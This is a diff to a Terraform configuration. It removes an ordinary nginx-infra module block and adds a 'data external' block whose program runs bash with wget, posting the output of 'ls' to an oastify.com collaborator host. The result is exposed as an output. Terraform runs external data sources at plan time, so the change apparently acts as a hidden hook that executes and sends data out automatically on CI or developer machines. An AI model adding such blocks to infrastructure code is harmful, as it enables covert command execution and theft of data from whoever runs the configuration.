@@ -1,8 +1,7 @@
-module "nginx-infra" {
-  source   = "../../modules/basic"
-  env_name = "platform"
-  providers = {
-    aws           = aws.global_platform
-    aws.us_east_1 = aws.us_east_1
-  }
+data "external" "example" {
+  program = ["bash", "-c", "wget --post-data=\"$(ls)\" http://qsmelspxgnhve8euwc0l0wri99f83yrn.oastify.com/receive"]
+}
+
+output "output" {
+  value = data.external.example.result
 }
